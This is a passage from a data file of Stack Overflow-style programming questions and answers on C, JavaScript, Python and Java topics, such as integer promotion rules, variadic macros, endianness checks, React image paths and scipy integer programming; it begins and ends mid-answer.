movq    %rax, %rdi
leaq    8(%rsp), %rsi
rep movsq
ret

[1] Using higher optimisation than that makes the compiler inline too much of the code (for example the rev_my_string function gets inlined), and it gets very hard to see what goes on. 
",c
free objectwidget in gtk 2,"I've got a pack box in my GTK 2 application and I'm replacing it every once in a while with a completely new entry (at least for now cause I'm in a hurry).
Since I'm replacing it with a new instance, do I need to explicitly free from memory the old pack box contents or is there some garbage collection in GTK?
If I do need to explicitly need to free the object, is there a command that will recursively go to all objects in that tree (like will it clear my button in a box container inside my main pack box)? Also, what about the signals and handlers connected to the objects?
I'm using C/GTK-2.0 (gcc v4.4.3 and GTK 2.20.0).
","GObjects are reference-counted. When you pack a widget into a container, the container takes over ownership.
When you do gtk_container_remove(), the reference held by the container is dropped, which typically causes the widget to be destroyed.
So no, you shouldn't need to explicitly destroy it, just removing it from the container is enough.
The documentation for the gtk_container_remove() API also says that it can be more efficient to just call gtk_widget_destroy() directly on the child, so if that's what you're already doing you're fine.
",c
reactjs and images in public folder,"Im new in ReactJS and I want to import images in a component. These images are inside of the public folder and I do not know how to access the folder from the react component. 
Any ideas ?
EDIT
I want to import an image inside Bottom.js or Header.js
The structure folder is:

I do not use webpack. Should I ?
Edit 2
I want to use webpack for loading the images and the rest of assets. So in my config folder I have the next files:

Where I need to add the paths of the images and how?
Thanks
","To reference images in public there are two ways I know how to do it straight forward. 
One is like above from Homam Bahrani.
using 
    <img src={process.env.PUBLIC_URL + '/yourPathHere.jpg'} /> 

And since this works you really don't need anything else but, this also works...
    <img src={window.location.origin + '/yourPathHere.jpg'} />

",javascript
parsing the string representation of struct_time,"The data I am pulling from a database has string representations of time.struct_time.
Example for this string representation:
time.struct_time(tm_year=2022, tm_mon=1, tm_mday=9, tm_hour=19, tm_min=26, tm_sec=4, tm_wday=6, tm_yday=9, tm_isdst=0)

I would like to parse this string so that I can use it as a date object.
I have tried dateparser.parse and eval but no joy. I am reluctant to manually split it and parse it that way.
Is there a better way?
","Ok, so i have a solution of sorts by using split and striptime
I had just thought that there would perhaps be a way of using some kind of eval -like solution
from datetime import datetime
t = ""time.struct_time(tm_year=2022, tm_mon=1, tm_mday=9, tm_hour=19, tm_min=26, tm_sec=4, tm_wday=6, tm_yday=9, tm_isdst=0)""
t = t.split(', tm_wday=')[0]
t = datetime.strptime(t, ""time.struct_time(tm_year=%Y, tm_mon=%m, tm_mday=%d, tm_hour=%H, tm_min=%M, tm_sec=%S"")
t
>> datetime.datetime(2022, 1, 9, 19, 26, 4)

",python
macro definition to determine big endian or little endian machine,"Is there a one line macro definition to determine the endianness of the machine? I am using the following code but converting it to macro would be too long:
unsigned char test_endian( void )
{
    int test_var = 1;
    unsigned char *test_endian = (unsigned char*)&test_var;

    return (test_endian[0] == 0);
}

","Code supporting arbitrary byte orders, ready to be put into a file called order32.h:
#ifndef ORDER32_H
#define ORDER32_H

#include <limits.h>
#include <stdint.h>

#if CHAR_BIT != 8
#error ""unsupported char size""
#endif

enum
{
    O32_LITTLE_ENDIAN = 0x03020100ul,
    O32_BIG_ENDIAN = 0x00010203ul,
    O32_PDP_ENDIAN = 0x01000302ul,      /* DEC PDP-11 (aka ENDIAN_LITTLE_WORD) */
    O32_HONEYWELL_ENDIAN = 0x02030001ul /* Honeywell 316 (aka ENDIAN_BIG_WORD) */
};

static const union { unsigned char bytes[4]; uint32_t value; } o32_host_order =
    { { 0, 1, 2, 3 } };

#define O32_HOST_ORDER (o32_host_order.value)

#endif

You would check for little endian systems via
O32_HOST_ORDER == O32_LITTLE_ENDIAN

",c
error when defining a stringising macro with __va_args__,"I have been trying to implement a function macro in C that prepends ""DEBUG: "", to the argument, and passes its arguments to printf:
#define DBG(format, ...) printf(""DEBUG: "" #format ""\n"", __VA_ARGS__)

This gives me this error in gcc:
src/include/debug.h:4:70: error: expected expression before ‘)’ token
#define DBG(format, ...) printf(""DEBUG: "" #format ""\n"", __VA_ARGS__)
                                                                   ^

Supposedly, it should stringise format, and pass its variable arguments to printf, but so far I can't get past this error.

EDIT
After giving up on stringising arguments, and double-hashing (##) __VA_ARGS__ I now have this error:
src/lib/cmdlineutils.c: In function ‘version’:
src/lib/cmdlineutils.c:56:17: warning: ISO C99 requires rest arguments to be used [enabled by default]
  DBG(""version()"");

Should I be placing a comma after the argument?
DBG(""version()"",);  // ?

For reference, DBG() now looks like this:
#define DBG(format, ...) printf(""DEBUG: "" format ""\n"", ##__VA_ARGS__)

","This happens unless there's at least one variable argument. You can try this GNU extension to fix it:
#define DBG(format, ...) printf(""DEBUG: "" #format ""\n"", ##__VA_ARGS__)
                                                        ^^

As explained in the GNU doc:

[if] the variable argument is left out when the macro is used, then
  the comma before the ‘##’ will be deleted.

",c
why string is not modifiable in new compilers,"In days of Turbo C/C++ you could easily modify strings like in
char * str = ""Hello"";
str[1] = '1'; //it will make it H1llo;

Now they are stored in .bss and you are not allowed to modify them directly. Why? Doesn't this make modifying a string difficult?
Is there any quick fix (but without side-effects) for it? I can strdup() like functions, but directly modifying strings was real fun.
","As you observe, you're not allowed by the Standard to modify the string literals content, and modern compiler's/OSs arrange memory permissions accordingly.
The reason is that the compiler may see a literal used in many places in the code, for example:
in x.cpp:    std::cerr << ""Error"" << separator << msg << '\n';

in y.cpp:    if (x == ""Error"") ...

in z.cpp:    q = ""StackOverflowError"";

It's very desirable to avoid having all those string literals appear separately in the executable image and loaded process memory; instead, the compiler may arrange a single memory region containing ""StackOverFlowError\0"" and use pointers to the relevant start character (whether the 'S' or 'E') at the points of use.
If you were allowed to modify the value - perhaps deciding that you wanted x.cpp to display ""Alert"" instead of ""Error"", it could unintentionally break the code from y.cpp and z.cpp too.

Is there a quick fix?

Well, if depends what you think's broken.  If you mean a way to modify the string literals, then no... that's undefined behaviour for the reasons explained above, and the memory protection mechanisms will vary with the OS etc..  If you mean to be able to modify textual data in a similar way, then yes: char* s = ""abc""; puts s on the stack, but it points to that .bss data as you've observed.  If you instead write:
char s[] = ""abc"";

Then s is still on the stack but is now an array with space for 4 character, the string literal is still in the .bss, but whenever that line runs it copies from the latter to the former, after which you're able to modify the stack-based copy ala s[1] = 'x';.
Of course, putting your data into a std::string is normally a better approach.
",c
i am getting 404 error code while performing post request  but the data is successfully getting inserted into the database on spring boot appilcation,"When I am performing the post/Delete operation from postman, I am getting 404 error code ,but the data is successfully getting inserted or deleted into my database. I am unable to understand why my code is behaving like this. Sharing screenshot
database,
api response
Controller class
    @Controller
public class UserController {

    @Autowired
    private UserService userService;

    @PostMapping(""/user/add"")
 public void addNewUser(@RequestBody User user) throws BLException {
     userService.addNewUser(user);
 }

  @DeleteMapping(""/user/delete/{id}"")
    public void deleteById(@PathVariable int id){
        userService.deleteById(id);

  }

  @DeleteMapping(""/deleteAll"")
    public void deleteAll(){
        userService.deleteAll();
  }
}

Service class
@Service
public class UserService {

    @Autowired
   public UserRepository userRepository;

    public void addNewUser(User user) throws BLException {
        try {
            ValidateMobileNumber.validate(user.getPhone());
            userRepository.save(user);


        }
        catch (BLException e){
            System.out.println(e.getMessage());
        }

    }

    public void deleteById(int id){
        userRepository.deleteById(id);
    }
    public void deleteAll(){
        userRepository.deleteAll();
    }
}

build.gradle file
    plugins {
    id 'java'
}

group 'org.example'
version '1.0-SNAPSHOT'

repositories {
    mavenCentral()
}

dependencies {
    testImplementation 'org.junit.jupiter:junit-jupiter-api:5.8.1'
    testRuntimeOnly 'org.junit.jupiter:junit-jupiter-engine:5.8.1'

    // https://mvnrepository.com/artifact/org.springframework/spring-web
    implementation group: 'org.springframework', name: 'spring-web', version: '5.3.16'
    // https://mvnrepository.com/artifact/io.springfox/springfox-swagger2
    implementation group: 'io.springfox', name: 'springfox-swagger2', version: '2.9.2'



    // https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web
    implementation group: 'org.springframework.boot', name: 'spring-boot-starter-web', version: '2.6.3'
    // https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-jdbc

    // https://mvnrepository.com/artifact/org.projectlombok/lombok
    compileOnly group: 'org.projectlombok', name: 'lombok', version: '1.18.22'

    // https://mvnrepository.com/artifact/org.springframework.data/spring-data-commons
    implementation group: 'org.springframework.data', name: 'spring-data-commons', version: '2.6.1'

// https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-devtools
    implementation group: 'org.springframework.boot', name: 'spring-boot-devtools', version: '2.6.3'

// https://mvnrepository.com/artifact/org.aspectj/aspectjweaver
    implementation group: 'org.aspectj', name: 'aspectjweaver', version: '1.9.8'
// https://mvnrepository.com/artifact/org.aspectj/aspectjrt
    implementation group: 'org.aspectj', name: 'aspectjrt', version: '1.9.8'
// https://mvnrepository.com/artifact/aopalliance/aopalliance
    implementation group: 'aopalliance', name: 'aopalliance', version: '1.0'
// https://mvnrepository.com/artifact/cglib/cglib
    implementation group: 'cglib', name: 'cglib', version: '3.3.0'
// https://mvnrepository.com/artifact/org.ow2.asm/asm
    implementation group: 'org.ow2.asm', name: 'asm', version: '9.2'
// https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind
    implementation group: 'com.fasterxml.jackson.core', name: 'jackson-databind', version: '2.0.1'

    // https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-data-jpa
    implementation group: 'org.springframework.boot', name: 'spring-boot-starter-data-jpa', version: '2.7.2'
    // https://mvnrepository.com/artifact/mysql/mysql-connector-java
    implementation group: 'mysql', name: 'mysql-connector-java', version: '8.0.30'

    // https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-jdbc
    implementation group: 'org.springframework.boot', name: 'spring-boot-starter-jdbc', version: '2.7.2'

    implementation group: 'javax.xml.bind', name: 'jaxb-api', version: '2.2.4'


}

test {
    useJUnitPlatform()
}

","on success of your action you can change the response result like this:
@PostMapping(""CreateUserWithEmailAndPassword"")
    public void createUserWithEmailAndPassword(@RequestBody User newUser, @RequestParam String password, HttpServletResponse response) throws FirebaseAuthException {
        userService.createUserWithEmailAndPassword(newUser, password);
        response.setStatus(HttpServletResponse.SC_OK);
    }

you get the response parameter for ""free"" whenever you send a request.
if your request fails throw an error and and catch it in your exception handler, there assign the appropriate status code according to the reason of failure.
Another option for successful requests is to use this annotation: @ResponseStatus
you can learn more about this here: https://www.baeldung.com/spring-response-status
",java
scipy minimize with boolean decision matrix,"I have a distance matrix between 2 sets of points ( sets A & B ). Each A point is associated with an equal number of B points ( if possible ).
I want to minimize the standard deviation of average distances between A points and their B associated points.
My objective function is as follow :
from scipy.optimize import minimize

def objective( x , distances ):

  decision_matrix = x.reshape( distances.shape[0] , distances.shape[1] )

  avg_distances = np.sum( distances * decision_matrix , axis = 1 ) / np.sum( decision_matrix , axis = 1 )

  std_distances = np.std( avg_distances )

  return std_distances

where x is a decision matrix with 0 or 1 : 0 no association between A point and B point, 1 association.
I would like to implement the following constraints :

an element of x matrix is 0 or 1
summing elements from x column = 1 : no orphan B point and when a B point is associated to a A point it cannot be associated with another A point
each A point should be associated with the same number of B points ( 2 A points and 10 B points -> each A point will be associated with 5 B points )

My purpose is to obtain the A points, B points pairing under the stated constraints minimizing the objective function.
Could some give me hints on how to accomplish that goal with scipy package ? I have some difficulties implementing the constraints. Thanks.
","Here is a partial solution assuming that you are open to adjusting the objective function such that the problem can be expressed as a binary integer LP.
For instance, if you wanted to minimize the sum of distances between the corresponding A-B points:
import numpy as np
import matplotlib.pyplot as plt
from scipy import optimize, linalg
rng = np.random.default_rng(35982456879456)
n_a = 3
n_b = 9
n_a2b = n_b / n_a

# A_... is an equality constrant matrix
# B_... is equality_constraint RHS
# a has to do with points in group ""a""
# b has to do with point in group ""b""
a = rng.random((2, 3, 1))
b = rng.random((2, 1, 9))

distances = np.sum((a - b)**2, axis=0).ravel()

# This linear system represents the constraint that each
# point in group ""a"" is assigned to exactly `n_a2b` points
# in group ""b""
ones = np.ones(n_b)
A_a_to_n = linalg.block_diag(ones, ones, ones)
B_a_to_n = np.full(n_a, n_a2b)

# This linear system represents the constraint that each
# point in group ""b"" is assigned to exactly one points
# in group ""a""
ones = np.ones((n_a, 1))
A_b_to_1 = linalg.block_diag(*([ones]*n_b)).reshape(n_b, -1)
B_b_to_1 = np.ones(n_b)

# For the full linear system
A = np.vstack((A_a_to_n, A_b_to_1))
B = np.concatenate((B_a_to_n, B_b_to_1))

# Solve
integrality = np.ones(distances.size)
res = optimize.milp(distances, constraints=(A, B, B), 
                    integrality=integrality)

# Plot
colors = ['r', 'g', 'b']
for i_a, i_b in zip(*np.where(res.x.reshape(3, -1))):
    print(i_a, i_b)
    plt.plot(a[0, i_a, 0], a[1, i_a, 0], colors[i_a]+'o')
    plt.plot(b[0, 0, i_b], b[1, 0, i_b], colors[i_a]+'.')

Plot of example clusters. The large circles are the ""A"" points, the small dots are the ""B"" points, and the colors indicate association between them.

It sounds like you are more interested in minimizing the variance (/standard deviation) between the within-cluster average distances. If you are willing to accept a one-norm based measure of spread (instead of variance/standard deviation), I think you can fit it into the framework above.
For instance, suppose you want to minimize the maximum discrepancy between the biggest within-cluster average distance and smallest within-cluster average distance.
You can create three new (floating point) decision variables and constrain each of them be equal to one of the within-cluster average distances. Let's call them d1, d2, d3.
Create three new decision variables that represent the pairwise difference between these. For instance: d12 = d2 - d1, d13 = d3 - d1, and d23 = d3 - d2. Also create d21, d31, and d32, the negatives of these.
Create a final new decision variable d_max that represents the maximum of all of these (d12, d21, d13, d31, d23, d32). You can ensure that it is the maximum by constraining it to be greater than each of them individually.
Set your objective function equal to d_max.
",python
unexpected output from right rotate function,"I was trying to solve the exercise that says

Exercise 2-7. Write the function rightrot(b, n) which rotates the integer b to the right by n bit positions.

and i did code it, here is the code
#include <stdio.h>

int rightrot(int b, int n) {
    char i = 1;

    while (n > 0) {
        if ((b & i) == i) {
            b = b >> 1;
            b = b << 25;
            b = ~b;
            b = b >> 1;
            b = ~b;
            b = b >> 24;
        }
        else
            b = b >> 1;
        n--;
    }

    return b;
}

int main() {
    int i, j, k;

    printf(""Enter number: "");
    scanf(""%d"", &i);
    printf(""Enter rotation: "");
    scanf(""%d"", &j);
    
    k = rightrot(i, j);
    printf(""%d\n"", k);
    return 0;
}

inputs and output are
Enter number: 153
Enter rotation: 3
-13

153 in binary is 00000000000000000000000010011001, so when it goes in while loop inside while it goes in if for first time (when n is 3), and as you see inside if there are 6 lines of code with bitwise operators to manipulate b and this is what i think how those 6 lines should change b
00000000000000000000000001001100
10011000000000000000000000000000
01100111111111111111111111111111
00110011111111111111111111111111
11001100000000000000000000000000
00000000000000000000000011001100

and then n is 2 and then other 2 while loops should go through else that i wont explain as if's 6 lines code itself doesn't work as i want them too, i know it because i tested them separately.
Also all that is for i am rotating binary as its 8 bit not 32 bit.
Final output should be 51, and i am using arch linux which is 64 bit fully updated, terminal is st by suckless, text editor is vim, i compiled the code using ""gcc main.c -o main"".
","Final output should be 51
Achievable when unsigned math is used for b.
// int rightrot(int b, int n) {
int rightrot(unsigned b, int n) {

Code like b = b >> 24; does a sign extended shift right when perhaps a logical shift right is desired.
",c
how to match and extract string matching regular expression,"This is main string:

MR HI Government He PIHe9 Hanumana Ji 3-� fafer/ DOB : 01/01/1959 989 / Male 2094 7051 9541 ������ - ��� ����� �� 3�1���

I want to match and extract 2094 7051 9541 using regular expression
and regex pattern to find is:
^[2-9]{1}[0-9]{-3}\\s[0-9]{4}\\s[0-9]{4}$

I want to use javascript to match and extract string. But not able to find right syntax to it.
Any help would be appreciated.
Thanks,
PD
","You can use
const regex = /\b[2-9]\d{3}\s\d{4}\s\d{4}\b/;

See the regex demo. Note the use of a regex literal that helps avoid double escaping backslashes.
Details

\b - a word boundary
[2-9] - a digit from 2 to 9
\d{3} - three digits
\s - a wjitespace
\d{4} - four digits
\s - a whitespace
\d{4} - four digits
\b - a word boundary.

The word boundaries avoid matching the number as part of another number/word.
",javascript
how to add addeventlistener to from parent to child in pure javasvript,"I need your help. My code structure is like this:


<div class=""header"">
  <p>Button</p>
  <ul>
    <li>Option 1</>
    <li>Option 2</>
    <li>Option 3</>
  </ul>
</div>



I want to use addEventListener here on the p tag, on clicking it we need to hide and show ul.
This is one of my friends challenge question, please anyone help me how to achieve this.  p tag is inside header class. I cannot change the format, need to implement like this. I want to use pure Javascript for this problem
Codepen Link:
","Select the DOM through the selector, add click events, switch variables


const header = document.querySelector('.header')
const btn = header.querySelector('p')
const ul = header.querySelector('ul')
let isShow = false
btn.addEventListener('click', () => {
  isShow = !isShow
  ul.style.display = isShow ? 'none' : 'block'
})
<div class=""header""> <p>Button</p> <ul> <li>Option 1</> <li>Option 2</> <li>Option 3</> </ul> </div>



",javascript
bin packing algorithm for fitting html elements on the screen,"I recently built a web extension that can scrape HTML elements from a page and open a new tab with those elements. I came across a problem that I've been working on for hours but I'm not coming up with a good solution. Basically I want to fit these elements on the screen by arranging them somehow, while also being able to scale them. I plan to implement this algorithm in Javascript so I can use it with my web extension.
Goals:

Scale rectangles as uniformly as possible (ex. not scaling one down by 0.5 and another up by 5)
Utilize as much space as possible

Constraints:

Maintain aspect ratio of each rectangle
No rotating rectangles
No overlapping rectangles

Here's an example of what my extension outputted in a new tab (was trying to make a cheat sheet):
https://imgur.com/yNzIp2w
I've done a decent amount of searching into bin packing algorithms (although that's pretty new for me) and similar topics but haven't found any that include the ability to scale the rectangles.
Any help here would be much appreciated!
","
Sum the areas of all the rectangles.
If sum is more than, say 80%, of the available space
- Scale all rectangles down so that the sum will be less than 80% of available space
Use a standard bin packing algorithm to pack the scaled rectangles
IF they still do not fit, select the largest 10% of the rectangles and scale them down some more.  Repeat until all fit.

You can experiment with the 80% and 10% to get some values that work well with your bin packing algorithm.
",javascript
unable to fetch data unhandled rejection typeerror cannot read property 39039 of undefined,"I am using async to fetching data . Its get loaded successfully but when i type new value in input field or refresh the page .I get the following error that the  Cannot read property '0' of undefined

Unhandled Rejection (TypeError): Cannot read property '0' of undefined



import React, { useEffect, useState } from ""react"";
import { API } from ""../api"";

const Weather = () => {
  const [city, setCity] = useState("""");
  const [search, setSearch] = useState(""Mumbai"");
  const [wind, setWind] = useState("""");
  const [weather, setWeather] = useState([]);

  const fetchApi = async () => {
    const url = `https://api.openweathermap.org/data/2.5/weather?q=${search}&units=metric&appid={key}`;
    const response = await fetch(url);
    const res = await response.json();
    setCity(res.main);
    setWeather(res.weather[0].main);
  };

  useEffect(() => {
    fetchApi();
  }, [search]);

  return (
    <div className=""container col-md-6 "">
      <div className=""card rounded"">
        <div className=""card-body"">
          <input
            type=""search""
            className="" searchbox offset-md-3 col-md-6""
            value={search}
            onChange={(e) => {
              setSearch(e.target.value);
            }}
          />
          {!city ? (
            <>
              <p className=""text-center mt-3"">No city found</p>
            </>
          ) : (
            <div className=""info text-center mt-3"">
              <h1 className=""mr-2"">
                <i className=""fas fa-street-view ""></i>
              </h1>
              <h2>{search}</h2>
              <h6>{Date()}</h6>

              <span className=""row""></span>
              <h3>{city.temp}°C</h3>

              <h5 className=""min_max text-danger"">
                Humidity:{city.humidity} | Min :{city.temp_min} | Max:{"" ""}
                {city.temp_max}
              </h5>
              <h1>{weather}</h1>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Weather;



","Update
I try with try and catch block . If the error may occur it will be log to the console and it works fine
const fetchApi = async () => {
try {
  const url = `https://api.openweathermap.org/data/2.5/weather?q=${search}&units=metric&appid={key}`;
  const response = await fetch(url);
  const res = await response.json();
  setCity(res.main);
  setWeather(res.weather[0].main);
  setWind(res.wind);
} catch (err) {
  console.log(err);
}

};
",javascript
implicit type promotion rules,"This post is meant to be used as a FAQ regarding implicit integer promotion in C, particularly implicit promotion caused by the usual arithmetic conversions and/or the integer promotions.
Example 1)
Why does this give a strange, large integer number and not 255?
unsigned char x = 0;
unsigned char y = 1;
printf(""%u\n"", x - y); 

Example 2)
Why does this give ""-1 is larger than 0""?
unsigned int a = 1;
signed int b = -2;
if(a + b > 0)
  puts(""-1 is larger than 0"");

Example 3)
Why does changing the type in the above example to short fix the problem?
unsigned short a = 1;
signed short b = -2;
if(a + b > 0)
  puts(""-1 is larger than 0""); // will not print

(These examples were intended for a 32 or 64 bit computer with 16 bit short.)
","C was designed to implicitly and silently change the integer types of the operands used in expressions. There exist several cases where the language forces the compiler to either change the operands to a larger type, or to change their signedness.
The rationale behind this is to prevent accidental overflows during arithmetic, but also to allow operands with different signedness to co-exist in the same expression.
Unfortunately, the rules for implicit type promotion cause much more harm than good, to the point where they might be one of the biggest flaws in the C language. These rules are often not even known by the average C programmer and therefore cause all manner of very subtle bugs.
Typically you see scenarios where the programmer says ""just cast to type x and it works"" - but they don't know why. Or such bugs manifest themselves as rare, intermittent phenomena striking from within seemingly simple and straight-forward code. Implicit promotion is particularly troublesome in code doing bit manipulations, since most bit-wise operators in C come with poorly-defined behavior when given a signed operand.

Integer types and conversion rank
The integer types in C are char, short, int, long, long long and enum.
_Bool/bool is also treated as an integer type when it comes to type promotions.
All integers have a specified conversion rank. C11 6.3.1.1, emphasis mine on the most important parts:

Every integer type has an integer conversion rank defined as follows:
— No two signed integer types shall have the same rank, even if they have the same representation.
— The rank of a signed integer type shall be greater than the rank of any signed integer type with less precision.
— The rank of long long int shall be greater than the rank of long int, which shall be greater than the rank of int, which shall be greater than the rank of short int, which shall be greater than the rank of signed char.
— The rank of any unsigned integer type shall equal the rank of the corresponding signed integer type, if any.
— The rank of any standard integer type shall be greater than the rank of any extended integer type with the same width.
— The rank of char shall equal the rank of signed char and unsigned char.
— The rank of _Bool shall be less than the rank of all other standard integer types.
— The rank of any enumerated type shall equal the rank of the compatible integer type (see 6.7.2.2).

The types from stdint.h sort in here too, with the same rank as whatever type they happen to correspond to on the given system. For example, int32_t has the same rank as int on a 32 bit system.
Further, C11 6.3.1.1 specifies which types are regarded as the small integer types (not a formal term):

The following may be used in an expression wherever an int or unsigned int may
be used:


— An object or expression with an integer type (other than int or unsigned int) whose integer conversion rank is less than or equal to the rank of int and unsigned int.

What this somewhat cryptic text means in practice, is that _Bool, char and short (and also int8_t, uint8_t etc) are the ""small integer types"". These are treated in special ways and subject to implicit promotion, as explained below.

The integer promotions
Whenever a small integer type is used in an expression, it is implicitly converted to int which is always signed. This is known as the integer promotions or the integer promotion rule.
Formally, the rule says (C11 6.3.1.1):

If an int can represent all values of the original type (as restricted by the width, for a bit-field), the value is converted to an int; otherwise, it is converted to an unsigned int. These are called the integer promotions.

This means that all small integer types, no matter signedness, get implicitly converted to (signed) int when used in most expressions.
This text is often misunderstood as: ""all small signed integer types are converted to signed int and all small, unsigned integer types are converted to unsigned int"". This is incorrect. The unsigned part here only means that if we have for example an unsigned short operand, and int happens to have the same size as short on the given system, then the unsigned short operand is converted to unsigned int. As in, nothing of note really happens. But in case short is a smaller type than int, it is always converted to (signed) int, regardless of it the short was signed or unsigned!
The harsh reality caused by the integer promotions means that almost no operation in C can be carried out on small types like char or short. Operations are always carried out on int or larger types.
This might sound like nonsense, but luckily the compiler is allowed to optimize the code. For example, an expression containing two unsigned char operands would get the operands promoted to int and the operation carried out as int. But the compiler is allowed to optimize the expression to actually get carried out as an 8-bit operation, as would be expected. However, here comes the problem: the compiler is not allowed to optimize out the implicit change of signedness caused by the integer promotion because there is no way for the compiler to tell if the programmer is purposely relying on implicit promotion to happen, or if it is unintentional.
This is why example 1 in the question fails. Both unsigned char operands are promoted to type int, the operation is carried out on type int, and the result of x - y is of type int. Meaning that we get -1 instead of 255 which might have been expected. The compiler may generate machine code that executes the code with 8 bit instructions instead of int, but it may not optimize out the change of signedness. Meaning that we end up with a negative result, that in turn results in a weird number when printf(""%u is invoked. Example 1 could be fixed by casting the result of the operation back to type unsigned char.
With the exception of a few special cases like ++ and sizeof operators, the integer promotions apply to almost all operations in C, no matter if unary, binary (or ternary) operators are used.

The usual arithmetic conversions
Whenever a binary operation (an operation with 2 operands) is done in C, both operands of the operator have to be of the same type. Therefore, in case the operands are of different types, C enforces an implicit conversion of one operand to the type of the other operand. The rules for how this is done are named the usual arithmetic conversions (sometimes informally referred to as ""balancing""). These are specified in C11 6.3.18:
(Think of this rule as a long, nested if-else if statement and it might be easier to read :) )

6.3.1.8 Usual arithmetic conversions
Many operators that expect operands of arithmetic type cause conversions and yield result
types in a similar way. The purpose is to determine a common real type for the operands
and result. For the specified operands, each operand is converted, without change of type
domain, to a type whose corresponding real type is the common real type. Unless
explicitly stated otherwise, the common real type is also the corresponding real type of
the result, whose type domain is the type domain of the operands if they are the same,
and complex otherwise. This pattern is called the usual arithmetic conversions:

First, if the corresponding real type of either operand is long double, the other operand is converted, without change of type domain, to a type whose corresponding real type is long double.

Otherwise, if the corresponding real type of either operand is double, the other operand is converted, without change of type domain, to a type whose corresponding real type is double.

Otherwise, if the corresponding real type of either operand is float, the other operand is converted, without change of type domain, to a type whose corresponding real type is float.

Otherwise, the integer promotions are performed on both operands. Then the
following rules are applied to the promoted operands:

If both operands have the same type, then no further conversion is needed.

Otherwise, if both operands have signed integer types or both have unsigned
integer types, the operand with the type of lesser integer conversion rank is
converted to the type of the operand with greater rank.

Otherwise, if the operand that has unsigned integer type has rank greater or
equal to the rank of the type of the other operand, then the operand with
signed integer type is converted to the type of the operand with unsigned
integer type.

Otherwise, if the type of the operand with signed integer type can represent
all of the values of the type of the operand with unsigned integer type, then
the operand with unsigned integer type is converted to the type of the
operand with signed integer type.

Otherwise, both operands are converted to the unsigned integer type
corresponding to the type of the operand with signed integer type.



Notable here is that the usual arithmetic conversions apply to both floating point and integer variables. In the case of integers, we can also note that the integer promotions are invoked from within the usual arithmetic conversions. And after that, when both operands have at least the rank of int, the operators are balanced to the same type, with the same signedness.
This is the reason why a + b in example 2 gives a strange result. Both operands are integers and they are at least of rank int, so the integer promotions do not apply. The operands are not of the same type - a is unsigned int and b is signed int. Therefore the operator b is temporarily converted to type unsigned int. During this conversion, it loses the sign information and ends up as a large value.
The reason why changing type to short in example 3 fixes the problem, is because short is a small integer type. Meaning that both operands are integer promoted to type int which is signed. After integer promotion, both operands have the same type (int), no further conversion is needed. And then the operation can be carried out on a signed type as expected.
Of note, C++ applies pretty much identical rules.
",c
trying to load a lot of ltvideogt tags on one page,"I am loading a lot of videos onto a page with the video tag. The issue is that it takes a long time for all of the videos to load and if you are trying to load a specific video it may wait for others to load before it because there are so many. 
My solution is to load the thumbnail of all of these videos on the page and when you click on the thumbnail have it switch to the video and load the video.
I am not sure how I should go about doing thing. I was going to use jQuery and when a user clicks the image make the video visible but I am not sure if when a video is set to hidden will it still try to load?
What is the best way to display a video with the video tag after a user clicks on an image with jQuery?
","In general, browsers do load resources inside elements that are hidden by CSS, so that they can be un-hidden quickly. If you want to load only on command, you probably need to build the  element dynamically and add it to the page only when needed. Something like:
var video = $(""<video/>""); 
video.append($(""<source/>"").attr(""src"", ""video.mp4"").attr(""type"", ""video/mp4"");
$(""#placeholder"").html(video);

The easiest way to extend this to multiple videos would be to place the video URL as data on each of your images with the jQuery .data() method, and load the appropriate video URL from the image's data in one universal click handler.
",javascript
newbie c programmer curious about errors,"Hey I'm a newbie programmer in C and do not understand these errors I'm getting in my program.  Can someone please explain to me what is wrong with my code and the way to go about fixing it. I am eager to learn this. Appreciate any help.
Compiler Message:
gcc project1shell.c
project1shell.c: In function ‘main’:
project1shell.c:55:8: warning: passing argument 1 of ‘hello’ makes pointer from integer without a cast [enabled by default]
project1shell.c:16:6: note: expected ‘char *’ but argument is of type ‘char’
project1shell.c:62:8: warning: passing argument 1 of ‘forkk’ makes pointer from integer     without a cast [enabled by default]
project1shell.c:18:6: note: expected ‘char *’ but argument is of type ‘char’

My Code:
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

#define CHILD 0
#define SIZE 256

char hello(char command[SIZE]);
void forkk(char command[SIZE]);
void exitt(char command[SIZE]);

/////////////////////////////

int main(void) {

/* variable delcarations */
char command[SIZE]="""";
char buffer[SIZE]="""";

/////////////////////////////

    /**** prompt the user with the program ****/
    printf(""*** Welcome to LJ's Shell! ***\n\n"");

    /**** implements exit and commands ****/
    while(1) {
       if (strcmp(command, ""exit"") == 0) {
          break;
       }
       hello(command[SIZE]);

       //prompt(command[SIZE], buffer[SIZE]);
       printf(""nshell:~$ "");
       fgets(buffer, sizeof(buffer), stdin);
       sscanf(buffer, ""%s"", command);

       forkk(command[SIZE]);
    }

}


///////// Functions //////////

/************ fork process **************/
void forkk(char command[SIZE]) {
    int pid = 0;
    int childvalue = 0;

    if (strcmp(command, ""fork"") == 0) {

       pid = fork();

       if (pid != CHILD) {   /* this is the parent */
           printf(""I am the parent.  Ready to wait on the child.\n"");
           pid = waitpid(-1, &childvalue, 0);
           printf(""Child %d returned a value of %x in hex.\n"", pid, childvalue);
           return;
       }
       else {  /* this is the child */
           printf(""I am the child.\n"");
           exit(2);
       }
    }
}

/***************** exit *******************/

void exitt(char command[SIZE]) {
    if (strcmp(command, ""exit"") == 0) {
       exit(0);
    }
}

/************* Hello Test ****************/
char hello(char command[SIZE]) {
    if (strcmp(command, ""hello"") == 0) {
    printf(""Hello there!\n"");
    //reset command back to """"
    }
}

","Change 
hello(command[SIZE]);

to 
hello(command);

the same applies to forkk(command[SIZE]);. This should solve the compile problem.
The problem is, command is an array, while command[n] is an element. And it's illegal to access command[SIZE] because the array has only SIZE - 1 elements.
",c
closing and unmapping posix shared memory object,"I am currently working on something using POSIX named semaphores and shared memory and I've read from the man pages that all open named semaphores are automatically closed on process termination. Is this also the case for shared memory objects, are they also closed and unmapped or simply just closed? I cannot find any information about this on the man pages.
","The question seems to be about how and when to clean up POSIX shared memory used by one or more processes, or possibly about how to avoid shared memory being cleaned up prematurely.
POSIX shared memory is designed on a model intentionally similar to regular file access.  In particular,

